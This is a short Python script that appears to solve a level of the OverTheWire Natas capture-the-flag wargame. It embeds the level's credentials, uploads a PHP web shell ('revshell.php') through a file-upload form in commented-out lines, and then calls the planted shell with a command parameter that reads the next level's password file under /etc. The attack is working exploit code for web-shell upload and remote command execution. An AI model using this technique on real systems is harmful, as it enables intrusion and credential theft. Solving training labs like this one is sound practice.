import requests
import re

username ='natas12'
password ='EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'

url = 'http://%s.natas.labs.overthewire.org/' %username

session = requests.Session()

data = {"filename":"revshell.php" , "MAX_FILE_SIZE":"1000"}
files = {"uploadedfile" : open('revshell.php','rb')}

# responce = session.post(url,data=data, auth = (username, password))
# responce = session.post(url,files = files ,data=data, auth = (username, password))

responce = session.get(url + "upload/mlqxfyrxb9.php?c=cat /etc/natas_webpass/natas13", auth = (username,password))

content = responce.text

# print(session.cookies['loggedin'])
print (content)

print ("password for natas13 is = " + re.findall('\n(.*)',content)[3])